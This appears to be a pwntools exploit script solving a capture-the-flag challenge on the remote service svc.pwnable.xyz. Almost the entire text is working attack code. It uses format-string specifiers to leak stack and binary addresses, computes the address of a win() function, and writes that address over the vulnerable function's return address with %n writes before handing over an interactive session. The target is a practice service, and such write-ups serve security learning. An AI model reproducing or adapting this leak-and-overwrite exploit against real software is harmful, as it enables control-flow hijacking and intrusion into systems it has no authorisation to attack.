from pwn import *

# context.log_level = 'debug'

# p = process('./challenge', aslr=False)
p = remote("svc.pwnable.xyz", 30010)

# gdb.attach(p, """ b* vuln+41""")

# stage 1. get address with 6byte format string

# 1.1. get ret address of vuln
p.sendafter('Name: ', 'a'*25+'%10$p')

p.sendlineafter('> ', '2')

vuln_sfp = int(p.recv(10), 16)
vuln_ret = vuln_sfp - 0xc

# 1.2. Get Base Address & function Address
p.sendlineafter('> ', '1')
p.sendafter('Name: ', "A"*25+"%2$p")
p.sendlineafter('> ', '2')
ret = int(p.recv(10), 16)

# vuln_offset = 0xa77
win_offset = 0x9fd
cmd_offset = 0x2040

cmd_addr = ret - 48
base_addr = cmd_addr - cmd_offset
win_addr = base_addr + win_offset

# base_addr = ret - vuln_offset
# win_addr = base_addr + win_offset
# cmd_addr = base_addr + cmd_offset

log.info(f"win_addr : {hex(win_addr)}")
log.info(f"cmd_addr : {hex(cmd_addr)}")
log.info(f"vuln_ret_addr : {hex(vuln_ret)}")

# tmp writable area
tmp_1 = base_addr + 0x2001
tmp_2 = base_addr + 0x2002

p.sendlineafter('> ', '1')
p.sendafter('Name: ', 'A'*27+'%6$n')
p.sendlineafter('> ', str(tmp_2))

for i in range(10):
    p.sendlineafter('> ', str(cmd_addr+38+i))

# win() address 2byte 
win_addr_a = win_addr & 0xffff # win() High Address
win_addr_b = (win_addr >> 16) & 0xffff # win() Low Address
    
#5.1 Insert win() High address
payload = "%"+str(win_addr_a-12)+"c%6$n\x00"
p.sendlineafter('> ', str(tmp_1))
p.recvuntil('Name: ')
p.send(payload)
p.sendlineafter('> ', str(vuln_ret-0x100000000))

#5.2 Insert win() Low address
payload = "%"+str(win_addr_b-12)+"c%6$n\x00"
p.sendlineafter('> ', str(tmp_1))
p.recvuntil('Name: ')
p.send(payload)
p.sendlineafter('> ', str(vuln_ret-0x100000000+2))

p.sendlineafter('> ', '0')
p.interactive()
# flag = p.recvline()

# print(flag.decode())
# p.interactive()